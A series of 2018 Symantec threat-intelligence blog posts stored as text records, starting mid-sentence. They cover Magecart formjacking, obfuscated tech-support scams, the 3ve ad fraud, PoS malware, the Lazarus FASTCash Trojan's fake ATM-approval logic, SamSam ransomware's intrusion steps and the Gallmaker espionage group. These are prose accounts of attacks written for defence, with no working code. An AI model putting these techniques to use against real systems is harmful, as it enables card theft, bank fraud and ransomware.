stealthy and take steps to avoid detection. Symantec customers are protected from formjacking attacks. Website owners should also be aware of the dangers of software supply chain attacks, as these have been used as the infection vector in some of these formjacking attacks. Software supply chain attacks can be difficult to guard against, but there are some steps that website owners can take: Producers of software packages should ensure that they are able to detect unwanted changes in the software update process and on their website. Website owners can also use content security policies withSubresource Integrity (SRI) tagsto lock down any integrated third-party scripts.

    "text": "In my previousblog, I discussed how technical support scammers embraced the technique of “living off the land” by making use of encryption algorithms such as Advanced Encryption Standard (AES) to obfuscate scam content. In the past, I alsowroteabout scammers’ use of simple encoding techniques to avoid string-based detection engines. In both scenarios, the scam made use of one unique technique across the board. The same obfuscation technique was used multiple times to decode the content on the fly and then perform its intended tasks: scaring the victim through various means, such as non-closing windows, pop-up windows which never seem to go away, preventing the victim from closing the scam by disallowing the pressing of certain keyboard keys, among others. This blog completes my trilogy of posts on obfuscated scams. This time, I look at how scammers make use of multiple encoding techniques at one go to create a multiple-level obfuscated scam which offers very little scope for detection engines. Typically, the scam starts when an unsuspecting user visits a malicious website or is redirected to one by various means, such as a malvertisement or compromised website. One such scam I observed on November 9 was in Italian, although similar campaigns may also come in other languages. This one in particular informs the victim that their computer has been blocked due to “display and dissemination of materials prohibited by Italian law” such as adult content. It also informs the victim that to unblock their computer, they must pay an “administrative penalty” of 500 euros with an iTunes Gift Card. Such tactics are designed to incite worry among victims and get them to pay. Going through the source code of the scam reveals a large chunk of obfuscated content, as shown in Figure 2. Moving further, I observed the code used for decryption of this obfuscated data: First, the obfuscated content is captured into a variable and then converted into a base64-encoded content. Then, this base64-encoded content is decoded using the function “atob” and written on the browser, as shown in Figure 3. After decoding the base64 content, I was able to see a few of the strings which the scam displays to the victim. However, the story does not end here. Moving further, I could still see obfuscated code and decryption routines being used. The code also loads the following JavaScript library, which is interesting: <script src=“https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js”></script><script> This CryptoJS library is widely used for AES obfuscation and deobfuscation. This indicates the scam uses AES as its second-level obfuscation technique. Decoding the AES obfuscated content reveals the final layer of the scam with almost no obfuscation being used. While code obfuscation has been used in scams for a while now, the use of multiple-level encoding is not common. The scam typically forces string-based detection engines to focus detection on strings of random numbers or characters as described above, which, in most scenarios, is highly prone to false positives. Thus, it can be said that this scam uses living off the land encoding techniques to sneak through antivirus engines and avoid detection. Symantec proactively protects customers against tech support scams. Our intrusion prevention system (IPS) technology protects customers against tech support scams by blocking malicious network activity associated with such scams using a wide variety of detections. From July through October 2018, Symantec’s IPS technology blocked more than 37 million tech support scams. Our IPS telemetry for this year shows that the countries most targeted by tech support scams were the U. S., Japan, Canada, UK, and Germany. From July through October 2018, Symantec IPS technology blocked more than 37 million tech support scams. Our IPS telemetry for 2018 shows that the countries most targeted by these scams were the U. S., Japan, Canada, UK, and Germany. Norton Security,Symantec Endpoint Protection, and many otherSymantec security productshave comprehensive network-based protection features such as firewall and IPS built in. To protect yourself from these types of scams, ensure that these features are enabled. Also, make sure to only visit legitimate websites when you need support for any product. Last but not least, make sure your security product is updated regularly. More information on tech support scams can be foundhere.

    "text": "An FBI-led law enforcement takedown dubbedOperation Eversion has led to the indictment of eight defendantsand the seizure of infrastructure associated with the 3ve ad-fraud scam. Symantec was involved in an industry group which assisted in the investigation by helping identify infrastructure used by the attackers. 3ve specializes in creating fake versions of legitimate websites in order to carry advertisements. It then drives fake traffic to these advertisements using infected computers. These fake visitors generate click-through revenue from the ads for the attackers. 3ve leveraged up to 700,000 infected computers and controlled over 1.7 million IP addresses at one point. Much of the fraudulent traffic was facilitated through botnets controlled by the Miuref (Trojan. Miuref) and Kovter (Trojan. Kotver) malware families. The machines that used the Miuref botnet were located mostly in data centers and were tasked with browsing to counterfeit websites. When the websites were loaded into a browser, requests were made for ads to be placed on those pages. These data center computers used the Miuref botnet as a proxy to request the ads in order to hide the true location of the request. The Kovter component of the ad-fraud operation used the Kovter botnet to run a hidden instance of the Chrome web browser on infected computers. The browser was used to visit the counterfeit websites. Once loaded, they requested ads to be placed on the website pages. Miuref and Kovter are Trojans spread through malicious email attachments and drive-by downloads from infected websites. Miuref loads several executable files onto infected computers. They may be found in one or more of the following locations: The HKEY_CURRENT_USER “Run” key is set to the path of one of the executables listed above: Kovter infections are located mostly in the registry, but the following files may be found on infected computers: Kovter is known to hide in the registry under: The keys appear like random values and contain scripts. In some cases, a user-agent string can be clearly identified. An additional key containing a link to a Bash script on the hard drive may be placed within the following registry key: Kovter is an evolution ofan older botnet known as Poweliks(Trojan. Poweliks). Like Kovter, Poweliks is a fileless threat that was developed from an earlier file-based variant, known at that time as Wowliks. Like Kovter, Poweliks was mainly deployed as a click-fraud botnet. Infected computers would silently visit web pages in a hidden browser window and display advertisements in that window.

    "text": "As we enter the busiest shopping period of the year, both offline and online retailers and consumers are facing risks to the security of their payment card data. Formjacking has surged in 2018—with Symantec blocking almost 700,000 formjacking attempts from mid-September to mid-November alone. This surge in formjacking is one of the big stories of 2018—withattackerslike Magecart using supply chain attacks and other tactics to inject malicious scripts into websites to steal payment card information. There have also beenattackson point-of-sale (PoS) systems in bricks-and-mortar stores this year, though none so far that compare to the mega breaches of earlier this decade, which saw tens of millions of credit cards compromised in a single breach. According to recent research from Symantec’s DeepsightManaged Adversary and Threat Intelligence (MATI) team(published in the MATI reportHow Cyber Criminals Monetize Unauthorized PoS System Access And Stolen Card Data- 01 Nov 2018), on dark net marketplaces threat actors are advertising access to PoS systems at prices ranging from $12 for administrative access to one PoS machine, to $60,000 for access to a large corporate network containing thousands of PoS servers and terminals. Meanwhile, depending on its quality, payment card data on the dark web retails for between $1 and $175 per card. The techniques used by PoS scammers remain straightforward and have not evolved greatly in the last number of years, with scammers still using “RAM-scraping” malware to steal payment card details. This RAM-scraping malware works because of how data generally travels around retailers’ systems. Two high-profile actors in the PoS malware space are FIN7 and FIN6. FIN7 is a well-known group that is reported to have stolen more than $1 billion from companies around the world. FIN7 uses sophisticated spear-phishing emails to convince targets to download an attachment that then infects their company network with malware. The malware used by FIN7 is most commonly a tailored version of theCarbanak malware, which has been used in multiple attacks on banks. Companies compromised by FIN7 include well-known brands like Chipotle, Chilli’s, and Arby’s, with the group thought to have compromised thousands of business locations and to have stolen millions of credit card numbers. FIN6 was first spotted in 2016 when it used the Grabnew backdoor and theFrameworkPOSmalware to steal the details of more than 10 million credit cards. The group was also active in 2018, and was seen exploiting living off the land tools such as Windows Management Instrumentation Command (WMIC) and the Metasploit framework to execute PowerShell commands. Both groups are believed to have made many millions of dollars selling the card details they steal on dark web marketplaces—with the Joker’s Stash marketplace appearing to be where most of these transactions take place. However, a few factors have emerged in recent times that may impact the environment around PoS attacks, and the activity of these groups: One new actor we have seen engaged in malicious activity on PoS machines in 2018 is a group we have dubbed Fleahopper. Fleahopper has been active since at least July 2017. It is a financially motivated group that appears to be monetizing its victims by stealing information from infected machines running PoS software. In the latter half of 2018, Fleahopper has been observed using the Necurs botnet to infect victims. It does this in two ways: through Necurs bots and through spam email, likely originating from the Necurs botnet. Symantec has observed Fleahopper delivering malware directly through Necurs bots, where the bots drop malware from Fleahopper onto machines already infected by Necurs. Machines that are not infected with Necurs may still be infected by Fleahopper through spam that comes from the Necurs botnet. Spam emails that deliver malware from Fleahopper have been observed with malicious Microsoft .pub files attached. These .pub files download an installer for the malware used by Fleahopper,Trojan. FlawedAmmyy. The Trojan. FlawedAmmyy RAT is a modified version of the publicly available remote access tool Ammyy Admin (Remacc. Ammyy). Although Trojan. FlawedAmmyy is not believed to be exclusive to Fleahopper, the group has been observed using Trojan. FlawedAmmyy to deliver its tools. Once they've compromised an organization, Fleahopper has been observed dropping a number of files onto machines running POS software. Fleahopper installs a modified legitimate Remote Desktop Protocol (RDP) file onto infected machines running POS software. This gives Fleahopper remote desktop access to the infected machine that is separate from access through malware. Symantec has observed Fleahopper using this access. Symantec has observed Fleahopper activity on machines in grocery stores, furniture stores, restaurants and a store selling men’s clothing. The group’s activity appears to be spread around the globe, with some activity seen targeting businesses based in the U. S. and the U. K. Some of the other PoS malware that has been seen used by various groups in the wild in 2018 includes: RtPOS, Prilex, LusyPOS,LockPOS, GratefulPOS, and FindPOS. There have been several publicly reported attacks on PoS systems in 2018: The compromise of Hudson’s Bay Company’s stores and Chili’s has been linked to FIN7. While these were significant compromises—the details of at least 5 million cards were compromised when the Hudson’s Bay Company stores were targeted—there have been no reports so far of PoS attacks this year affecting tens of millions of consumers. This relative drop in activity in the PoS space compared to previous years could be down to the reasons mentioned above—the increased adoption of chip-and-PIN globally and upset in the FIN7 group. However, it may also indicate that attackers are looking at other ways to make money and get their hands on payment card details—for example, by turning to formjacking. We firstpublished research on formjacking at the end of September 2018, after a spate of high-profile attacks by the Magecart attack group. Among Magecart’s targets were Ticketmaster UK, British Airways, Feedify, and Newegg. One of itsmore recent targetswas British electronics kit retailer Kitronik. Formjacking is a term we use to describe the use of malicious JavaScript code to steal credit card details and other information from payment forms on the checkout web pages of e-commerce sites. It is not a new technique, but in the latter half of 2018, it has garnered a lot of attention due to some large campaigns, many of which have been carried out by Magecart. Recently released research has claimed that Magecart is not just one group—but rather approximately seven groups that are all engaged in similar activity. When a customer of an e-commerce site clicks “submit” or its equivalent after entering their details into a website’s payment form, malicious JavaScript code that has been injected there by the cyber criminals collects all entered information, such as payment card details and the user’s name and address. This information is then sent to the attacker’s servers. Attackers can then use this information to perform payment card fraud or sell these details to other criminals on the dark web. In a two-month period, from mid-September to mid-November, Symantec blocked almost 700,000 formjacking attempts—with a clear upward trend visible as we approach the holiday shopping season. Much as we reported in September, these formjacking attempts target a wide range of e-commerce websites, including a fashion retailer in Southeast Asia, and another in Australia, a U. S. website selling jewelry, and another U. S. store specializing in outdoor gear and equipment. Suppliers of equipment for dentists, and online stores selling gardening equipment, were also among those targeted. These formjacking attempts continue to target a wide range of stores—ranging from small to large retailers in various countries around the world. We detailed in our previous research how, in some cases, Magecart was using supply chain attacks to gain access to its targeted websites and carry out these formjacking attacks. The Magecart attackersinjected malicious JavaScript code into Ticketmaster’s websiteafter they compromised a chatbot from tech firm Inbenta that was used for customer support on Ticketmaster websites, for example. Magecart was then able to alter the JavaScript code on Ticketmaster’s websites to capture payment card data from customers and send it to their servers. Dutch security researcherWillem de Groot has discovered since thenthat Magecart is also exploiting unpatched vulnerabilities in 21 Magento extensions used by online stores to gain access to websites. Magento is an open-source e-commerce platform. Magecart is using a series of URL paths to probe Magento stores in the wild for the vulnerable extensions, and injecting its malicious code into vulnerable websites. As we approach the holiday shopping season, it is likely that we will see a ramping up of activity from actors out to steal consumers’ payment card details—both online and in retail stores worldwide. Victims may not realize they are victims of formjacking as generally their websites continue to operate as normal, and attackers like Magecart are sophisticated and stealthy and take steps to avoid detection. Website owners should be aware of the dangers of software supply chain attacks, as these have been used as the infection vector in some of these formjacking attacks. Software supply chain attacks can be difficult to guard against, but there are some steps that website owners can take: Producers of software packages should ensure that they are able to detect unwanted changes in the software update process and on their website. Website owners can also use content security policieswith Subresource Integrity tags (SRI)to lock down any integrated third-party script.

    "text": "On October 2, 2018,an alert was issued by US-CERT, the Department of Homeland Security, the Department of the Treasury, and the FBI. According to this new alert, Hidden Cobra (the U. S. government’s code name for Lazarus) has been conducting “FASTCash” attacks, stealing money from Automated Teller Machines (ATMs) from banks in Asia and Africa since at least 2016. Lazarus is a very active attack group involved in both cyber crime and espionage. The group was initially known for its espionage operations and a number of high-profile disruptive attacks, including the 2014 attack on Sony Pictures. More recently, Lazarus has also become involved in financially motivated attacks, including anUS$81 million theft from the Bangladesh Central Bankand theWannaCry ransomware. Following US-CERT's report, Symantec’s research uncovered the key component used in the group's recent wave of financial attacks. The operation, known as “FASTCash”, has enabled Lazarus to fraudulently empty ATMs of cash. To make the fraudulent withdrawals, Lazarus first breaches targeted banks’ networks and compromises the switch application servers handling ATM transactions. Once these servers are compromised, previously unknown malware (Trojan. Fastcash) is deployed. This malware in turn intercepts fraudulent Lazarus cash withdrawal requests and sends fake approval responses, allowing the attackers to steal cash from ATMs. According to the U. S. government alert, one incident in 2017 saw cash withdrawn simultaneously from ATMs in over 30 different countries. In another major incident in 2018, cash was taken from ATMs in 23 separate countries. To date, the Lazarus FASTCash operation is estimated to have stolen tens of millions of dollars. In order to permit their fraudulent withdrawals from ATMs, the attackers inject a malicious Advanced Interactive eXecutive (AIX) executable into a running, legitimate process on the switch application server of a financial transaction network, in this case a network handling ATM transactions. The malicious executable contains logic to construct fraudulent ISO 8583 messages. ISO 8583 is the standard for financial transaction messaging. The purpose of this executable has not been previously documented. It was previously believed that the attackers used scripts to manipulate legitimate software on the server into enabling the fraudulent activity. However, analysis by Symantec has found that this executable is in fact malware, which we have namedTrojan. Fastcash. Trojan. Fastcash has two primary functions: Once installed on the server, Trojan. Fastcash will read all incoming network traffic, scanning for incoming ISO 8583 request messages. It will read the Primary Account Number (PAN) on all messages and, if it finds any containing a PAN number used by the attackers, the malware will attempt to modify these messages. How the messages are modified depends on each victim organization. It will then transmit a fake response message approving fraudulent withdrawal requests. The result is that attempts to withdraw money via an ATM by the Lazarus attackers will be approved. Here is one example of the response logic that Trojan. Fastcash uses to generate fake responses. This particular sample has logic to construct one of three fake responses based on the incoming attacker request: For Message Type Indicator == 200 (ATM Transaction) and Point of Service Entry Mode starts with 90 (Magnetic Strip only): If Processing Code starts with 3 (Balance Inquiry): Response Code = 00 (Approved) Otherwise, if the Primary Account Number is Blacklisted by Attackers: Response Code = 55 (Invalid PIN) All other Processing Codes (with non-blacklisted PANs): Response Code = 00 (Approved) In this case, the attackers appear to have built in a capability to selectively deny transactions based on their own blacklist of account numbers. However, the capability was not implemented in this sample, and the check for blacklisting always returns “False”. Symantec has found several different variants of Trojan. Fastcash, each of which uses different response logic. We believe that each variant is tailored for a particular transaction processing network and thus has its own tailored response logic. The PAN numbers used to carry out the FASTCash attacks relate to real accounts. According to the US-CERT report, most accounts used to initiate the transactions had minimal account activity or zero balances. How the attackers gain control of these accounts remains unclear. It is possible the attackers are opening the accounts themselves and making withdrawal requests with cards issued to those accounts. Another possibility is the attackers are using stolen cards to perform the attacks. In all reported FASTCash attacks to date, the attackers have compromised banking application servers running unsupported versions of the AIX operating system, beyond the end of their service pack support dates. Lazarus is a very active group involved in both cyber crime and espionage. Lazarus was initially known for its involvement in espionage operations and a number of high-profile disruptive attacks, includingthe 2014 attack on Sony Picturesthat saw large amounts of information being stolen and computers wiped by malware. In recent years, Lazarus has also become involved in financially motivated attacks. The group waslinked to the $81 million theft from the Bangladesh central bank in 2016, along with a number of other bank heists. Lazarus was alsolinked to the WannaCry ransomware outbreakin May 2017. WannaCry incorporated the leaked “EternalBlue” exploit that used two known vulnerabilities in Windows (CVE-2017-0144andCVE-2017-0145) to turn the ransomware into a worm, capable of spreading itself to any unpatched computers on the victim’s network and also to other vulnerable computers connected to the internet. Within hours of its release, WannaCry had infected hundreds of thousands of computers worldwide. The recent wave of FASTCash attacks demonstrates that financially motivated attacks are not simply a passing interest for the Lazarus group and can now be considered one of its core activities. As with the 2016 series of virtual bank heists, including the Bangladesh Bank heist, FASTCash illustrates that Lazarus possesses an in-depth knowledge of banking systems and transaction processing protocols and has the expertise to leverage that knowledge in order to steal large sums from vulnerable banks. In short, Lazarus continues to pose a serious threat to the financial sector and organizations should take all necessary steps to ensure that their payment systems are fully up to date and secured. Symantec has the following detections in place to protect customers against Lazarus FASTCash attacks: Organizations should ensure that operating systems and all other software are up to date. Software updates will frequently include patches for newly discovered security vulnerabilities that could be exploited by attackers. In all reported FASTCash attacks to date, the attackers have compromised banking application servers running unsupported versions of the AIX operating system, beyond the end of their service pack support dates.

    "text": "UPDATE: November 29, 2018Two Iranian nationals have beenindicted in the U. S.for their alleged involvement in SamSam attacks. The FBI estimated that the SamSam group had received $6 million in ransom payments to date and caused over $30 million in losses to victims. The group behind the SamSam ransomware (Ransom. SamSam) has continued to mount attacks against entire organizations during 2018, with fresh attacks seen against 67 different targets, mostly located in the U. S. SamSam specializes in targeted ransomware attacks, breaking into networks and encrypting multiple computers across an organization before issuing a high-value ransom demand. The group is believed to be behind the attack on the city of Atlanta in March, which saw numerous municipal computers encrypted. The clean-up costs for the attack areexpected to run to over $10 million. The group was also linked to the attack on the Colorado Department of Transportation, whichresulted in clean-up costs of $1.5 million. During 2018, Symantec has to date found evidence of attacks against 67 different organizations. SamSam targeted organizations in a wide range of sectors, but healthcare was by far the most affected sector, accounting for 24 percent of attacks in 2018. Why healthcare was a particular focus remains unknown. The attackers may believe that healthcare organizations are easier to infect. Or they may believe that these organizations are more likely to pay the ransom. A number of local government organizations in the U. S. were also targeted by the group and at least one of these organizations is involved in administering elections. With the midterm elections in the U. S. taking place on November 6, the focus is naturally on cyber information operations and threats to voting data integrity. However, ransomware campaigns such as SamSam can also be significantly disruptive to government organizations and their operations. The vast majority of SamSam’s targets are located in the U. S. Of the 67 organizations targeted during 2018, 56 were located in the U. S. A small number of attacks were logged in Portugal, France, Australia, Ireland, and Israel. While most ransomware families are spread indiscriminately, usually via spam emails or exploit kits, SamSam is used in a targeted fashion. The SamSam group’s modus operandi is to gain access to an organization’s network, spend time performing reconnaissance by mapping out the network, before encrypting as many computers as possible and presenting the organization with a single ransom demand. The attackers have been known to offer to decrypt all computers for a set ransom and/or offer to decrypt individual machines for a lower fee. In many cases, ransom demands can run to tens of thousands of dollars to decrypt all affected computers in an organization. If successful, these attacks can have a devastating impact on victim organizations, seriously disrupting their operations, destroying business critical information, and leading to massive clean-up costs. The attackers behind SamSam go to great lengths to infect as many computers as possible in a targeted organization. Multiple software tools are used to carry out an attack and, in many cases, the entire process can take days to complete. In order to carry out its attacks, the SamSam group makes extensive use of “living off the land” tactics: the use of operating system features or legitimate network administration tools to compromise victims’ networks. These tactics are frequently used by espionage groups in order to maintain a low profile on the target’s network. By making their activity appear like legitimate processes, they hope to hide in plain sight. For example, in one attack that took place in February 2018, more than 48 hours passed between the first evidence of intrusion and the eventual encryption of hundreds of computers in the targeted organization. The first sign of an intrusion came when the attackers downloaded several hacking tools onto a computer in the targeted organization. Ten minutes later, the attackers began running scripts in order to identify and scan other computers on the organization’s network. They used PsInfo, a Microsoft Sysinternals tool that allows the user to gather information about other computers on the network. This could allow them to identify the software installed on these computers. PsInfo may have been used to identify systems with business-critical files that could be encrypted for ransom. The attackers also used the freely available hacking tool Mimikatz (Hacktool. Mimikatz) against selected computers to steal passwords. After this initial flurry of activity, the attackers returned two days later and, shortly after 5 a.m., loaded the SamSam ransomware onto the initial computer. Interestingly, two different versions of SamSam were loaded. It is likely that two versions were used in order to have an alternative at hand in case one version was detected by security software. An hour later, the attacks began executing SamSam on multiple computers across the organization’s network. This operation was carried out using PsExec, another Microsoft Sysinternals tool, which is used for executing processes on other systems. Five hours later, just under 250 computers on the network had been encrypted. SamSam continues to pose a grave threat to organizations in the U. S. The group is skilled and resourceful, capable of using tactics and tools more commonly seen in espionage attacks. A successful SamSam attack will likely be highly disruptive to any affected organizations. In the worst-case scenario, if no backups are available or if backups are encrypted by SamSam, valuable data could be permanently lost in an attack. Even if an organization does have backups, restoring affected computers and cleaning up the network will cost time and money and may lead to reputational damage. The following protections are in place to protect customers against SamSam attacks: In addition, Symantec’s Targeted Attack Analytics (TAA) is able to identify and flag “living off the land” activity associated with targeted attacks such as SamSam. To find out more about TAA, read our white paperTargeted Attack Analytics: Using Cloud-based Artificial Intelligence for Enterprise-Focused Advanced Threat Protection Backing up important data is one of the key pillars of combating ransomware infections. However, as there have been cases of ransomware encrypting backups, it should not be a replacement for a robust security strategy. Victims need to be aware that paying the ransom does not always work. Attackers may not send a decryption key, could poorly implement the decryption process and damage files, and may deliver a larger ransom demand after receiving the initial payment.

    "text": "UPDATE October 11, 2018 This blog has been updated with a revised list of IoCs. An earlier list of IOCs attached to this blog was generated through an automated system and, due to the dual-use nature of the tools used by the group, erroneously included some low fidelity IoCs. Symantec researchers have uncovered a previously unknown attack group that is targeting government and military targets, including several overseas embassies of an Eastern European country, and military and defense targets in the Middle East. This group eschews custom malware and uses living off the land (LotL) tactics and publicly available hack tools to carry out activities that bear all the hallmarks of a cyber espionage campaign. The group, which we have given the name Gallmaker, has been operating since at least December 2017, with its most recent activity observed in June 2018. The most interesting aspect of Gallmaker’s approach is that the group doesn’t use malware in its operations. Rather, the attack activity we observed is carried out exclusively using LotL tactics and publicly available hack tools. The group takes a number of steps to gain access to a victim’s device and then deploys several different attack tools, as follows: Gallmaker is using three primary IP addresses for its C&C infrastructure to communicate with infected devices. There is also evidence that it is deleting some of its tools from victim machines once it is finished, to hide traces of its activity. The DDE protocol can be used for legitimate purposes to send messages between Microsoft applications that share data through shared memory, e.g. to share data between Excel and Word. However, the DDE protocolwas flagged as unsecure last year, when researchers discovered it could be exploited to execute code on victim machines via Excel and Word, without macros being enabled in those applications. Microsoft said at the timethat this capability was a feature and the company did not consider it a vulnerabilitybecause Office always warned users before enabling DDE in documents, as seen in Figure 1. However, after the DDE protocol was subsequently exploited in a number of malware campaigns, Microsoft issued an update to Office in December 2017that disabled DDE by default in Word and Excel. DDE can be enabled manually after this update is applied but only if the registry is altered by an admin account. The Gallmaker victims we have seen did not have this patch installed and therefore were still vulnerable to exploit via the DDE protocol. Gallmaker’s activity appears to be highly targeted, with its victims all related to government, military, or defense sectors. Several targets are embassies of an Eastern European country. The targeted embassies are located in a number of different regions globally, but all have the same home country. The other targets we have seen are a Middle Eastern defense contractor and a military organization. There are no obvious links between the Eastern European and Middle Eastern targets, but it is clear that Gallmaker is specifically targeting the defense, military, and government sectors: its targets appear unlikely to be random or accidental. Gallmaker’s activity has been quite consistent since we started tracking it. The group has carried out attacks most months since December 2017. Its activity subsequently increased in the second quarter of 2018, with a particular spike in April 2018. Gallmaker’s activity points strongly to it being a cyber espionage campaign, likely carried out by a state-sponsored group. Gallmaker may well have continued to avoid detection were it not for Symantec’s Targeted Attack Analytics (TAA) technology. The fact that Gallmaker appears to rely exclusively on LotL tactics and publicly available hack tools makes its activities extremely hard to detect. We havewritten extensively about the increasing use of LotL toolsand publicly available hack tools by cyber criminals. One of the primary reasons for the increased popularity of these kinds of tools is to avoid detection; attackers are hoping to “hide in plain sight”, with their malicious activity hidden in a sea of legitimate processes. Gallmaker may well have continued to avoid detection were it not for Symantec’sTargeted Attack Analytics (TAA)technology. TAA combines the capabilities of Symantec’s world-leading security experts with advanced artificial intelligence and machine learning to provide organizations with their own “virtual analysts”, via our Advanced Threat Protection (ATP) product. Since its inception, TAA has detected security incidents at thousands of organizations, automating what would have taken many hours of analyst time. In this instance, TAA identified the specific PowerShell commands used by Gallmaker as being suspicious, leading to the discovery of this new campaign. Without TAA’s advanced AI-based capabilities, Gallmaker’s activities may well have remained undetected. The following protections are in place to protect customers against Gallmaker attacks: Network protection products also detect activity associated with Gallmaker. The following indicators are specific to Gallmaker: Gallmaker also used tools that were available in open source projects. Yara rule and methods shared below were used by Gallmaker but aren't exclusive to the group's activity. Detection of these in one's environment is only indicative of possible unauthorized activity.

    "text": "For more than a decade, Symantec has been publishing monthly intelligence reports, providing a snapshot of what is happening on the threat landscape. Over the years these reports have focused on a variety of activity, covering topics ranging from spam to botnets (and even spam botnets). Back in early 2016, we moved away from PDF reports and launched a new, dynamic page on the Symantec website, providing the latest intelligence available. Today we are happy to share the next iteration of thisLatest Intelligence page. With this new page comes a whole new set of metrics, previously only available annually in the ISTR, along with several old favorites from the intelligence reports over the years. We have also revamped the look and feel of the page, making it easier to navigate, as well as providing a more mobile-device-friendly interface. This new approach allows us the opportunity to tell new stories surrounding the threat landscape. We can now share trends on specific malicious activity classifications, ranging from ransomware, to cryptojacking events, to attacks against IoT devices. To provide a few real-world examples from just last month, financial Trojan activity rose in September by 12.5 percent when compared to August. Then, looking at the specific financial Trojans active during this time frame, we can see that Ramnit is responsible for the lion’s share of activity. However, it appears that this Trojan’s activity declined 6.9 percentage points since August. In comparison, Emotet and Trickybot saw an increase of 8.3 and 2.7 percentage points respectively, likely contributing to the overall increase in activity. Another interesting item that we decided to look at with the launch of this new page is network attack types. The metric reveals that SMB-related attacks dominate this field, comprising around half of all such attacks in a given month. In contrast, attacks against technologies such as Flash and Java, which were quite popular in past years, have declined drastically, well down into the single digits. As we stated in early 2016, when the first version of the Latest Intelligence page launched, the threat landscape is never the same two months in a row. One month there is a jump in web attacks; another might see a spike in downloader activity. This can make the threat landscape a tricky scene to navigate. We hope that ournew Latest Intelligence pagehelps make doing so just a little easier.

    "text": "Symantec has seen a major uptick in formjacking attacks recently, with publicly reported attacks on the websites of companies including Ticketmaster, British Airways, Feedify, and Newegg by a group called Magecart being the most notable examples. Formjacking is a term we use to describe the use of malicious JavaScript code to steal credit card details and other information from payment forms on the checkout web pages of e-commerce sites. Formjacking is not a new technique, but recent campaigns are interesting as they are large, sophisticated, and have increased dramatically since mid-August 2018. Symantec’s Intrusions Prevention System (IPS) technology proactively protects website users from formjacking attacks. When a customer of an e-commerce site clicks “submit” or its equivalent after entering their details into a website’s payment form, malicious JavaScript code that has been injected there by the cyber criminals collects all entered information, such as payment card details and the user’s name and address. This information is then sent to the attacker’s servers. Attackers can then use this information to perform payment card fraud or sell these details to other criminals on the dark web. This is a significant and sustained campaign, with activity increasing substantially in the week of September 13 to 20. According to Symantec telemetry, since August 13 we have blocked 248,000 attempts at formjacking—almost a quarter of a million instances. However, more than one third of those blocks (36 percent) occurred from September 13 to 20, indicating that this activity is increasing. If we compare the week of September 13 to 20 to the same week in August, the number of instances of formjacking blocked by Symantec more than doubled, jumping from just over 41,000 to almost 88,500—a percentage increase of 117 percent. Since August 13, we have blocked an average of 6,368 formjacking attempts every day. Our data shows that any company, anywhere in the world, which processes payments online is a potential victim of formjacking As we can see from the publicly reported attacks, Magecart is targeting large e-commerce businesses like Ticketmaster, British Airways, and Newegg. To get an insight into the type of businesses that are being targeted by formjacking attacks, we examined 1,000 instances of formjacking blocked by Symantec over a three-day period from September 18 to 20. Symantec data showed that from these 1,000 instances 57 individual websites were impacted. These websites were mostly online retail sites ranging from small niche sites to larger retail operations. Websites affected ranged from a fashion retailer in Australia, to a supplier of outdoor accessories in France, and a fitness retailer in Italy. Other retailers affected included a supplier of parts for cars and sites selling kitchen accessories and customized gifts. While the compromise of larger organizations such as British Airways and Ticketmaster makes headlines, our data shows that any company, anywhere in the world, which processes payments online is a potential victim of formjacking. Magecart is the attack group behind the recent formjacking attacks on British Airways, Ticketmaster, Feedify, and Newegg. Magecart has been active since at least 2015. The group injects web-based card skimmers onto websites to steal payment card data and other sensitive information from online payment forms. The group used to primarily focus on hacking into Magneto online stores, but it appears to have changed tactics recently, and we now see it using formjacking and supply chain compromise to steal payment card data. There are many ways attackers can attempt to compromise websites, but in the Ticketmaster formjacking case the Magecart attackers used a supply chain attack to gain access to the website and change the code on its payment page. Wewrote about supply chain attacks in ISTR 23and predicted we would continue to see them occurring frequently in 2018—and we have. Supply chain attacks can allow attackers to gain access to large companies by exploiting weaknesses in smaller businesses used by the larger company to provide different services. Thefamous Petya/NotPetya campaign, for example, was distributed via a supply chain attack. Supply chain attacks are particularly challenging because it doesn’t matter how good your business’ cyber security is if other businesses with access to your network can be exploited by attackers. The uptick in formjacking attacks came to wider notice following the Ticketmasterbreach, which was reported in June. The Magecart attackers injected malicious JavaScript code onto Ticketmaster’s website after they compromised a chatbot from tech firm Inbenta that was used for customer support on Ticketmaster websites. Magecart was then able to alter the JavaScript code on Ticketmaster’s websites to capture payment card data from customers and send it to their servers. The code may have been on the Ticketmaster website for almost a year, with international Ticketmaster customers warned they may have been affected if they bought tickets between September 2017 and June 2018. Inbenta said Magecart had exploited a number of vulnerabilities to target its front-end servers and alter the chatbot code. Following the Ticketmaster breachit was revealed that Magecart was widely targeting third-party companies that are used on e-commerce sitesto manage analytics, website support, and other services. The report at that time said at least 800 e-commerce sites had been hit in that campaign. The danger is that if Magecart can compromise one widely used third-party supplier, they could potentially infect thousands of sites in one go. Feedify is one such third-party service that is used by many websites to serve up push notifications to website visitors. It wasnotified by a threat researcher on September 11 that some of its JavaScript code had been modifiedwith the Magecart script, which prompted Feedify to delete the code. However, within 24 hours the code had been modified again, Feedify again deleted it but it once again reappeared, with threat researchers subsequently warning users of Feedify to stop using it until the issue was resolved. Magecart’sattack on British Airways—which the airline said impacted 380,000 passengers—was, along with Ticketmaster, its most high-profile attack so far. In the attacks on both British Airways andU. S. electronics retailer Newegg, the Magecart attackers took steps to avoid detection, including setting up spoofed web domains designed to look like those of the legitimate company. They even purchased paid SSL certificates from Comodo to make them look more like legitimate servers. British Airways and Newegg were both compromised in a similar manner, with a small amount of JavaScript code added to a page on the companies’ websites to allow entered payment information to be sent to the Magecart attackers’ servers via the spoofed domains. The attacks took place in a similar timeframe, with Magecart present on British Airway’s website from August 21 to September 5, and Newegg’s website from August 14 to September 18. In the cases of both British Airways and Newegg the initial infection vector that allowed the attackers to gain access to the websites is not known. Victims may not realize they are victims of formjacking as generally their websites continue to operate as normal, and attackers like Magecart are sophisticated and stealthy and take steps to avoid detection. Symantec customers are protected from formjacking attacks. Network-based protection File-based protection Website owners should also be aware of the dangers of software supply chain attacks, as these have been used as the infection vector in some of these formjacking attacks. Software supply chain attacks can be difficult to guard against, but there are some steps that website owners can take: Producers of software packages should ensure that they are able to detect unwanted changes in the software update process and on their website. Website owners can also use content security policieswith Subresource Integrity tags (SRI)to lock down any integrated third-party script.

